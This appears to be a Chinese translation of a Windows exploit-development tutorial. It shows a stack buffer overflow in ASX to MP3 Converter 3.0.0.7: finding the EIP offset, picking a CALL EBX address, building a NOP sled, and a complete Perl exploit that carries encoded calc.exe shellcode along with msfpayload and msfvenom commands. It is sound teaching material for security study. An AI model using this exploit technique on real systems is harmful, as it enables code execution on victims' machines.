#### 翻译自 [这里](http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)，转发请标注原作者
2022-5-30
***

### 序言

欢迎来到我的windows漏洞攻击开发系列的第 2 部分。在第一篇文章中，我介绍了一些基本概念，这些概念应被视为继续第2部分及以后的先决条件。

### 介绍基本的栈溢出漏洞

在这一部分中，我将使用 Wikipedia 中的以下简单程序继续我们的教程。

![1](part2\1.png) 

在第1部分，我提到将大于11个字符的参数传递给 strcpy() 函数会由于缺少边界检查而导致缓冲区溢出，让我们看看发生了什么，回想一下strcpy()函数是怎么样将arg[1]的用户输入写入栈中的。

![2](part2\2.png) 

如果输入少于12个字符，不会产生任何问题（函数foo中为变量c分配给堆栈的大小），但是如果输入超过11个字符，strcpy()函数将继续将输入写入栈中，而不在乎它是如何被分配的。**注意：如果您想知道为什么输入字符限制是11而不是12（因为变量大小是12），那是因为您必须为自动字符串终止符分配内存**。

例如，如果我们使用150个A作为参数运行这个程序，我们最终会得到一个如下所示的栈：

![3](part2\3.png) 

就像你看到的一样，strcpy()用argv[1]覆写了所有的基指针（被保存的EBP）和函数返回地址（被保存的EIP），**不需要关心SEH指针和SE句柄，我将在后面的章节提到**。现在当程序跳转到被保存的EIP地址时，它将尝试跟随 41414141(AAAA)并引发错误异常。

![4](part2\4.png)

再说明一次，因为strcpy()没有做边界检查，所以它不会验证分配给变量c的空间，并且将继续向栈中写入arg[1],直到arg[1]被完全写入。由于局部变量被写入保存的返回地址和其他重要数据的栈中，并且argv[1]被写入堆，因此 EIP 将被A覆盖。

![5](part2\5.png)

因为我们可以完全控制传递给程序的参数，感谢栈溢出，我们也能完全控制EIP，也就是说我们也能控制程序的执行流的本身。这意味着我们能重定向程序让它从执行原来的代码到执行我们的代码。这是一个简单的栈溢出漏洞，让我们来看看一个真实的程序。

### 发现一个程序漏洞

让我们借此机会介绍一下[Exploit Database](http://www.exploit-db.com/)，一个漏洞利用档案馆，在许多情况下还包括可供下载的相关易受攻击的软件。它是漏洞利用开发的绝佳资源，也是提交您自己的漏洞利用的好地方。在以后的文章中，我将讨论如何找到你自己的软件漏洞，但对于这个介绍性演示，让我们使用现有的软件。

对于此示例，我将参考[Cyber​​-Zone于2009年提交的针对ASX到MP3转换器漏洞](http://www.exploit-db.com/exploits/8407/)，让我看看再exploit-db上公开的代码，在打开包含“http://”+26121个A的一个音乐列表文件（.m3u）后，EIP被41414141覆写。现在已经有一个POC了，但是它并没有导致一个RCE，只是程序崩溃，需要指出的是POC并没有指出哪个软件版本有漏洞。它是在 法语版的Windows XP SP2上编写的
。这意味着我们可能得到不同的结果在不同的操作系统上。考虑到这些，让我们下载[download ASX to MP3 Converter version 3.0.0.7](http://asx-to-mp3-converter.en.softonic.com/)，并且在windows XP SP3上安装。

### 复现漏洞

让我们开始构建我们的攻击并且复现POC使程序崩溃，我使用perl来写这个攻击脚本。

![6](part2\6.png)

如您所见，Perl脚本创建了一个包含50000个A的m3u文件，需要注意的是原来POC中的“http://”不是必须的，尽管一些基于m3u的攻击需要类似location/path的格式才能生效。你也可以研究有效的m3u文件的contents/header来理解为什么这是可行的。还需要注意的是对于这个攻击，保存m3u文件的路径最终也是会影响EIP的覆写的，所以请确保文件名和我的例子相同（asx2mp3.m3u），在打开ASX to MP3之前请保存它到根目录c:\下。

运行perl脚本（perl asx2mp3.pl）生成m3u文件到c:\下，打开ASX TO MP3 Converter并且attach immunity Debugger（确保使用F9运行软件）。

![7](part2\7.png)

用ASX to MP3打开asx2mp3.m3u文件，通过拖拽它到程序，你应当看到程序崩溃，并且在immunity中看到EIP被覆写。

![8](part2\8.png)
![9](part2\9.png)

### 控制EIP覆写（确定填充）

好的，现在我们确认了POC可以是程序崩溃，为了控制程序，我们需要做的第一件事是发现在我们的50000个字符中哪个字符覆写了EIP（就是所谓的offset），我们可以通过反复试验来做到这一点，方法是用多个字符（例如 A、B、C、D 和 E 各10000个）构建我们的缓冲区，并查看 EIP 被覆盖的位置，如下图所示。

![10](part2\10.png)

![11](part2\11.png)

EIP被C覆盖，所以从这里你可以缩小范围在20001到30000，然后以较小的增量将它们分解，直到找到覆盖EIP的确切4个字节。虽然有效，但这要花费很多的时间，我们可以使用Metasploit pattern_create/pattern_offset 函数（您可以在Kali Linux上找到）找到确切的EIP覆盖，而不是多次尝试。

```ruby
root@kali:/# locate *pattern_*.rb
/usr/share/metasploit-framework/tools/pattern_create.rb
/usr/share/metasploit-framework/tools/pattern_offset.rb
```
使用pattern_create,我能创建一个50000长度的模板，将它插入我们的m3u文件，生成一个新的文件。

```ruby
root@kali:/# /usr/share/metasploit-framework/tools/pattern_create.rb 50000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad...
```

![12](part2\12.png)

在immunity中重启ASX to MP3（Ctrl + F2），打开我们新创建的m3u文件，检查immunity，我们会发现EIP被48376D48覆写。

![13](part2\13.png)

要在我们的 50,000 个字符缓冲区中找到此 EIP 覆盖的确切偏移量，我们将使用 pattern_offset.rb。语法如下

```ruby
root@kali:/# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x48376D48 50000
```
![14](part2\14.png)

在这种情况下，实际偏移量是第二个 (26121)，与发布到Exploit-DB.com的原始POC中的相同。我们可以通过如下修改脚本来测试：

![15](part2\15.png)

在上面的脚本。我增加了变量$junk，26121个A，也就是EIP填充，下面四个bytes应当填充EIP，我选择了B，50000 个字符缓冲区的剩余部分用C填充，使用更新的m3u文件重新运行程序可以确认EIP 的偏移量，并如希望的那样被4B覆盖。您还可以在栈和内存窗口中查看缓冲区的内容。

![16](part2\16.png)

让我们看看另一种生成模式并计算偏移量的方法，这次使用immunity的Mona插件。将插件保存到Immunity的PyCommands 文件夹后，从调试器中启动 ASX to MP3。

如果你想使用mona生成metasploit模板，你可以输入!mona pc 50,000 ，它会将模板写入文本文件，由于我在单独的 Kali机器上编写大部分漏洞利用程序，因此我更喜欢使用pattern_create.rb。无论哪种方式，无论哪种方式，一旦您创建了包含50000字节模板的漏洞利用m3u文件并导致应用程序在Immunity中崩溃，现在可以使用findmsp mona命令。使用此命令(!mona findmsp)mona将定位EIP覆写以及其他非常有用的信息，例如哪些寄存器包含缓冲区的一部分。如果您要运行!mona findmsp命令，您的输出应该如下所示：

![17](part2\17.png)

请注意它是如何仅在偏移5841处找到一个EIP模板的，这可能看起来很熟悉，因为它是我之前展示的 Metasploit pattern_offset.rb 脚本找到的三个匹配中的第一个。这是因为开箱即用版本的mona.py中的findmsp函数使用python find()函数查找偏移量，如下所示

```python
offset = regpattern.find(hexpat))
```
如果你熟悉python，find函数只返回匹配项的第一个，而不是所有，在我们的情况下，有价值的offset其实是第二个，我将升级我的mona使用正则匹配来代替find函数，循环遍历所有出现的匹配以构造所有可能偏移量的字符串，如果你有兴趣，下面是基本代码（我应该警告你这是一个hack，需要一些额外的代码更改）

```python
match in re.finditer(hexpat, regpattern):
    if offsetstr != "":
        divisor = " and "
    offsetstr = offsetstr + divisor + match.start( )

    ...

    [be sure to edit dbg.log to write offsetstr as %s]
```
结果如下

![18](part2\18.png)

### 为我们的shellcode找一个位置

现在我们确认了，我们可以控制EIP，我们准备修改攻击脚本来让它执行我们的代码，为了重定向到有用的地方，我们需要确定生成的shellcode将驻留在哪里，为此，我们需要在应用程序崩溃时，检查CPU寄存器和内存内容。让我们回到CPU视图中

请注意，目前有三个寄存器指向我们 50000字节缓冲区中的某个位置EBX、ESP和EBP

![19](part2\19.png)

我们想使用我们的EIP覆盖来告诉程序重定向到这些寄存器之一并执行它指向的代码。我们选择哪个寄存器取决于几件事

1. **该位置的不间断代码量**，有时我们的漏洞利用代码在程序写入内存时可能会被破坏或截断，所以我们需要确保我们有足够的空间来插入可用的shellcode（通常至少500字节）并且代码不会被程序以任何方式修改。

2. **我们重定向到其中一个寄存器的能力**，为了告诉程序重定向到指向我们的shellcode的寄存器，我们需要用现有指令的地址覆盖EIP，例如JMP或CALL，请记住，EIP被指向指令的地址指针覆盖，而不是实际指令。换句话说，我们不能用jump ESP（\xff\xe4）对应的操作码覆盖EIP。相反，我们需要用指向此类指令的内存地址覆盖它。最重要的是，我们需要确保我们使用的地址不包含空字节 (\x00)，为什么？因为空字节充当终止符，这意味着一旦程序遇到空字节，执行就会终止，并且您在EIP覆盖之后放置的任何内容（在本例中为我们的shellcode）都不会执行。空字节规则有一些例外，但对于第一个示例，请记住，我们试图避免包含空字节的地址。如果您对此感到困惑，请不要担心我会演示。

好的，所以我们需要告诉程序重定向或“jump”到包含我们的shellcode的寄存器。在这种情况下，我们很幸运，因为我们有三个可能的寄存器可供选择：EBX、ESP和EBP。

让我们检查寄存器EBX是否符合第一个标准：该位置的不间断代码量。在 CPU Registers窗格中，右键单击 EBX中的地址并选择“Follow in Dump”。

![20](part2\20.png)

在“Memory Dum”窗格（左下角）中，您应该看到该地址的内容以及随后的地址的内容。开始向下滚动，注意查看我们插入的缓冲区中是否有任何中断。最终，您应该会看到一个中断，在我的情况下，它就在位置000FCFCC之后。

![21](part2\21.png)

为了估计我们在EBX有多少不间断的 shellcode空间，我们可以从000FCFCC中减去EBX的开始（000FBBD4）。这达到0x13F8或**5112**字节。有足够的可用空间，所以EBX是一个不错的选择。

我们可以使用其他两个寄存器（ESP 和EBP）继续此练习，以确定最大空间所在的位置。或者，我们可以使用 !mona findmsp检查可用空间。请记住，findmsp显示的偏移量仅对应于第一个。

![22](part2\22.png)

如果我们按可用空间计算，似乎ESP 拥有最多，所以让我们检查ESP的第二个标准：我们使用EIP覆盖重定向到该位置的能力。对于第一个基于堆的溢出示例，我们将坚持使用简单的jump或call指令，它们将我们直接带到我们想要的寄存器。为此，我们需要找到一条**JMP ESP**或**CALL ESP**指令。

以下是在Immunity中执行此操作的方法

右击CPU View的CPU指令面板，选择“Search for”，点击“All Commands in all modules”。这将在所有加载的模块（.exe 和所有 DLL）中搜索我们的 jmp/call 指令

![23](part2\23.png)

输入所需的指令，在本例中为“jmp esp”

![24](part2\24.png)

正如您在下面的屏幕截图中看到的那样，我们得到了很多结果，但问题是唯一可用的地址（绿色的）是操作系统（对比于程序）模块，请注意，它们使用“C:\WINDOWS”与“C:\Program Files\Mini-Stream\ASX to MP3 Converter”，如果没有替代品，这些DLL/模块当然可以用作有效的 jmp 指令，操作系统模块可能因Windows的不同“风格”而异。例如，Windows SP2 和SP3之间或SP3法语版和SP3英语版之间的DLL地址可能不同。为了确保您的漏洞利用代码具有更好的可移植性，您应该尽可能从程序模块中选择指令。

![25](part2\25.png)

不幸的是，如果我们尝试“call esp”，我们会得到类似的结果（所有都是操作系统模块）。**我们可以尝试其他指令，但为了简单起见，我坚持使用简单的jump或call演示此示例**。

![26](part2\26.png)

尽管没有程序模块包含ESP寄存器所需的 jmp/call 指令，但在此示例中我们很幸运有两个其他寄存器指向我们的缓冲区，因此我们不使用OS模块，而是尝试使用不同的寄存器。

尝试搜索“call ebx”。这一次，在结果中包括许多来自程序的地址。

![27](part2\27.png)

这些结果的问题是它们都以空字节开头，正如您所记得的那样，它将充当字符串终止符，阻止执行我们的EIP覆盖之后的shellcode。在结果中进一步向下滚动，您应该会看到一些不以空字节开头的内容

![28](part2\28.png)

让我们选择一个，我将选择01C27228（来自MSA2Mcodec00.dll）。这是我们将用来覆盖EIP的值。**您的“call ebx”地址将与您在上面的屏幕截图中看到的不同，因为地址“变基”。事实上，正如您将在第3部分中看到的那样，在这种情况下，有充分的理由选择OS模块而不是程序模块，尽管我不想在下一篇文章之前讨论这个问题。现在，您可以继续从应用程序模块中选择任何“call ebx”地址，只要它不包含空字节即可。请注意，如果您重新启动计算机，该漏洞将不再起作用，您必须返回并选择另一个“call ebx”地址。**

好的，所以我们已经成功地复现了程序崩溃，验证了对EIP的控制，验证了我们对EIP(26121)的偏移量，我们有一个寄存器(EBX)指向我们缓冲区中足够的不间断部分，并且我们有一个可用的CALL EBX指令的地址，它将用来覆盖EIP。让我们将所有这些合并到我们的漏洞利用代码中。

![29](part2\29.png)

### 寻找shellcode offset

现在我们已经有了50000byte的缓冲区了。

![30](part2\30.png)

EBX寄存器指向缓冲区$fill部分的约 5100字节部分，但在我们需要知道在哪里，这样我们才能战略性地放置我们的shellcode。我们可以使用几种不同的方法来确定我们的shellcode偏移量

*暂停程序执行以确定 shellcode 偏移量*

看看我们的漏洞利用的下一个屏幕截图。

![31](part2\31.png)

我所做的是使用INT（中断）指令（十六进制的\xcc）构建缓冲区的$fill部分。当应用程序到达INT指令时，它会暂停执行。这与调试器一起使用非常有用，因为它允许我们在执行CALL EBX时准确查看我们在缓冲区中的位置。让我们看看当我们打开包含这个更新的m3u文件时会发生什么。

![32](part2\32.png)

您可以看到，当程序命中INT指令并暂停时，EBX包含000FBBD4和EIP000FBBD5（当前指令）。如果我们在memory dump窗格中跟随后一个地址，并向上滚动直到我们开始我们的缓冲区填充，我们最终会在地址 000F729E附近结束。如果我们从 000FBBD5（EBX的开头）中减去这个地址，我们得到 0x4937或18743。这是我们的CALL EBX指令后面的缓冲区的大致长度，我们将把我们的shellcode 放在它后面。为什么我说近似？有可能我们的缓冲区的一部分在写入内存时被损坏或删除了，所以我们知道我们的原始缓冲区的$fill部分至少有18743字节需要在我们的shellcode之前。稍后我将向您展示如何获得更精确的长度。

另一种发现它的方式是，我们应该从我们的缓冲区多远开始放置我们的漏洞利用代码？要找出答案，请将18743添加到$fill之前的缓冲区长度（junk + EIP = 26,125），即44868。换句话说，至少，我们的shellcode应该在我们缓冲区的前44,686字节之后开始（尽管我们会想要更多地填充它以考虑内存位置的变化或我们的缓冲区可能损坏）。

使用中断来暂停程序执行并检查内存/寄存器是确定shellcode在缓冲区中的位置的一种快速方法，但还有更精确的方法。

*使用 Metasploit pattern_offset.rb确定shellcode偏移量*

Metasploit偏移脚本可以准确地告诉我们EBX在基于模式的缓冲区中指向的位置（使用pattern_create.rb脚本）。回忆一下我们在崩溃程序，覆写EIP时寄存器的内容：

![33](part2\33.png)

EBX以Fn9F开头。使用metasploit计算偏移的ruby​​脚本，我们可以准确地找出它在缓冲区中的位置。

![34](part2\34.png)

在我们的例子中，偏移量是44877。在将其合并到我们的脚本之前，让我向您展示如何使用mona插件获得相同的结果。

*使用mona确定shellcode偏移量*

您可以再次参考来自mona的 findmsp结果，以查看我们EBX在缓冲区中的偏移量。

![35](part2\35.png)

同样，使用开箱即用的mona插件，您只会看到第一个偏移量，但这个屏幕截图是我使用了更新过的代码，它确认了44877的偏移量。现在我们知道了我们的shellcode的偏移量，让我们相应地更新我们的漏洞利用缓冲区。假设偏移量为44877，前26125个字节将被缓冲区的“junk”部分（26121个字节和我们的EIP覆盖（4个字节）。也就是说shellcode之前需要18752个字节 。让我们调整我们的脚本来测试一下。

![36](part2\36.png)

我在这里所做的是添加另一个变量“$nops”，它将保存EIP覆盖之后和我们的shellcode之间的缓冲区部分，以模拟我们的shellcode偏移量44877。我将$nops的长度设置为比我们的 shellcode之前需要的长度多一倍，并将其包含所有INT指令，这样如果程序执行到$nops内的某个位置，它将立即暂停，我们可以看到我们结束的地方。如果pattern_offset/mona的偏移量是正确的，调用EBX应该正好落在缓冲区的$nops部分（18752 + 1）中的最后一条INT指令上。让我们使用更新后的m3u漏洞利用文件运行程序并查看 Immunity

![37](part2\37.png)

如您所见，我们准确地落在了最后一条中断指令上，下一条要执行的指令是缓冲区$fill部分的第一个字节（即将成为shellcode），这意味着 pattern_offset/mona 提供的偏移量是准确的.现实情况是我们不必如此准确—，我们最初估计的位置可以很好地为我们服务，因为我们可以（并且应该）总是在我们的shellcode之前放置一个无害的缓冲区，以允许内存地址的偏差。

为此，我们通常使用所谓的无操作指令(NOP)，它在x86 架构上由十六进制值0x90表示。将这些NOP串在一起形成通常称为NOP滑轨的东西。当程序执行遇到这一系列NOP时，它会“滑动”直到遇到一组可执行指令，在我们的例子中，这就是我们接下来的shellcode。

在构建缓冲区时，将EIP CALL/JMP 指令置于一系列NOPS的开头/中间位置通常是一个好主意。由于我们有很大一部分可用于我们的shellcode，我将在它之前添加一个长度为18,852的 NOP（18752偏移 + 额外的 100 用于填充）。我们缓冲区的整个部分将用作我们的shellcode偏移量和我们的NOP雪橇。现在我们的缓冲区如下所示（最后一部分为我们的shellcode保留）

![38](part2\38.png)

### 构建shellcode

我们需要的最后一件事是一些实际的 shellcode。当然，我们选择的 shellcode取决于我们希望漏洞利用做什么，生成一个远程shell，添加一个管理用户等。在我们的例子中，我们将选择更温和的东西，打开Windows计算器(calc.exe)。接下来我们要考虑的是是否有任何字符会破坏我们的 shellcode。例如，由于已经讨论过的原因，空字节在shellcode中可能是有问题的。同样有问题的是回车、换行和其他字符串终止符。也可能存在应用程序本身无法处理某些字符或更改某些字符的值（转换/编码等）的情况。因此，shellcode的创建有时可能需要反复试验。幸运的是，在这种情况下，shellcode创建非常简单。您可以从 Exploit DB下载/复制shellcode，但在本示例中，我将向您展示如何使用Metasploit创建一些基本的有效载荷。

Metasploit有一个名为msfpayload的命令行shellcode生成函数。您可以使用-l开关查看特定于Windows的有效负载

```bash
msfpayload -l | grep windows
```

在我们的例子中，我们将使用 windows/exec，它可以执行任意命令，适合调用calc.exe。要使用 msfpayload，您需要知道与每个有效负载相关的选项，您可以通过在有效负载名称后面加上大写O来获得这些选项。给定可用选项，有效负载的语法如下

```bash
msfpayload windows/exec CMD=calc.exe R
```

如果您检查了带有“O”参数的选项，您可能已经注意到一个名为“EXITFUNC”的附加选项。此参数控制shellcode 在完成时如何退出。我没有为 EXITFUNC 指定一个值，这意味着将使用“thread”作为默认值，它只终止关联的线程。有效载荷退出的其他选项是SEH（让异常处理程序管理退出）和 Process（杀死整个进程而不仅仅是线程）。EXITFUNC选项可以对漏洞利用终止时的行为方式产生很大影响，因此您可能需要进行试验。例如，如果您将漏洞代码注入到必须在漏洞利用终止后继续运行的父进程中，您可能希望避免进程并坚持使用线程。同样，如果应用程序未实现任何错误处理，则选择 SEH 作为选项可能会导致进程在退出时挂起。

CMD 选项是不言自明的，“R”代表 Raw，它将我们的shellcode输出为原始字节码。但是，在将 shellcode 合并到脚本之前，我们需要对其进行编码。为此，我们可以将 msfpayload 输出通过管道传输到msfencode函数，如下所示

```bash
msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/shikata_ga_nai -c 1 -t perl -b '\x00\x0a\x0d\xff'
```
-e开关告诉msfencode使用哪个编码器， -c开关告诉执行多少次迭代， -t开关指示输出格式，-b开关告诉编码器要排除哪些“bad”字符。此命令生成227字节编码的有效负载。请记住，选择编码器可能会受到应用程序如何对用户输入进行编码（例如unicode）的影响，并且还可以通过某些AV规避技术派上用场。附带说明一下，您还可以使用msfvenom模块实现相同的功能，如下所示

```bash
msfvenom -p windows/exec CMD=calc.exe -f perl -b '\x00\xff\x0a\x0d'
```

使用哪一个（msfpayload w/msfencode或msfvenom）实际上只是一个偏好问题。 您可以在此处找到有关使用 msfpayload 的更多信息：http://www.offensive-security.com/metasploit-unleashed/Msfpayload

### 组合到一起

现在我们有了227字节的 shellcode，我们的最终缓冲区看起来像这样（请注意，如果我们想使用不同的更大的shellcode，我们还有额外的4796字节可用）

![39](part2\39.png)

完整代码

```perl
#!/usr/bin/perl

#########################################################################
# Exploit Title: ASX to MP3 Converter 3.0.0.7 (.m3u) Stack-Based BOF
# Date: 12-13-2013
# Exploit Author: Mike Czumak (T_v3rn1x) — @SecuritySift
# Vulnerable Software/Version: ASX to MP3 Converter 3.0.0.7
# Link: http://www.mini-stream.net/asx-to-mp3-converter/download/
# Tested On: Windows XP SP3
# Credits:
# — Original POC by Cyber-Zone: http://www.exploit-db.com/exploits/8407/
#########################################################################

my $buffsize = 50000; # sets buffer size for consistent sized payload
my $junk = “\x41” x 26121; # offset to EIP overwrite
my $eip = pack(‘V’, 0x01C27228); # call ebp (MSA2Mcodec00.dll) – YOURS WILL DIFFER!
my $nops = “\x90” x 18752;

# msfpayload windows/exec CMD=calc.exe R |
# msfencode -e x86/shikata_ga_nai -c 1 -t perl -b ‘\x00\x0a\x0d\xff’
# size 227
my $shell =
“\xba\x8d\xf5\x02\x51\xda\xc0\xd9\x74\x24\xf4\x5b\x2b\xc9” .
“\xb1\x33\x31\x53\x12\x03\x53\x12\x83\x66\x09\xe0\xa4\x84” .
“\x1a\x6c\x46\x74\xdb\x0f\xce\x91\xea\x1d\xb4\xd2\x5f\x92” .
“\xbe\xb6\x53\x59\x92\x22\xe7\x2f\x3b\x45\x40\x85\x1d\x68” .
“\x51\x2b\xa2\x26\x91\x2d\x5e\x34\xc6\x8d\x5f\xf7\x1b\xcf” .
“\x98\xe5\xd4\x9d\x71\x62\x46\x32\xf5\x36\x5b\x33\xd9\x3d” .
“\xe3\x4b\x5c\x81\x90\xe1\x5f\xd1\x09\x7d\x17\xc9\x22\xd9” .
“\x88\xe8\xe7\x39\xf4\xa3\x8c\x8a\x8e\x32\x45\xc3\x6f\x05” .
“\xa9\x88\x51\xaa\x24\xd0\x96\x0c\xd7\xa7\xec\x6f\x6a\xb0” .
“\x36\x12\xb0\x35\xab\xb4\x33\xed\x0f\x45\x97\x68\xdb\x49” .
“\x5c\xfe\x83\x4d\x63\xd3\xbf\x69\xe8\xd2\x6f\xf8\xaa\xf0” .
“\xab\xa1\x69\x98\xea\x0f\xdf\xa5\xed\xf7\x80\x03\x65\x15” .
“\xd4\x32\x24\x73\x2b\xb6\x52\x3a\x2b\xc8\x5c\x6c\x44\xf9” .
“\xd7\xe3\x13\x06\x32\x40\xeb\x4c\x1f\xe0\x64\x09\xf5\xb1” .
“\xe8\xaa\x23\xf5\x14\x29\xc6\x85\xe2\x31\xa3\x80\xaf\xf5” .
“\x5f\xf8\xa0\x93\x5f\xaf\xc1\xb1\x03\x2e\x52\x59\xea\xd5” .
“\xd2\xf8\xf2”;

my $sploit = $junk.$eip.$nops.$shell; # sploit portion of buffer
my $fill = “\x43” x ($buffsize – (length($sploit))); # filler for consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = “asx2mp3.m3u”;
open(FILE, “>$file”);
print FILE $buffer;
close(FILE);
print “Exploit file created [” . $file . “]\n”;
print “Buffer size: ” . length($buffer) . “\n”;
```

生成最终的.m3u文件并使用ASX To MP3 Converter打开它，您应该会看到

![40](part2\40.png)

如果calc没有打开，请确保您正在从 C:\ 的根目录运行.m3u文件，并且您已将文件命名为asx2mp3.m3u。请记住，由于文件路径对成功执行的影响以及实现地址变基的程序模块 (DLL)的使用，此漏洞利用远非完美。我们将在 3部分中探讨如何解决这两个问题。

### 结论

这就是本系列的第2部分。希望您了解基于栈的缓冲区溢出的基础知识，包括它为什么会出现问题、它如何在软件程序中表现出来以及如何利用它来强制执行任意代码。在第3部分中，我将继续讨论基于栈的溢出以及如何克服诸如动态EIP偏移和稍微复杂的shellcode 跳转等基本问题。我将再次从ASX To MP3应用程序开始，并展示一种我们可以克服由于在内存中包含文件路径而导致的EIP偏移变化的方法。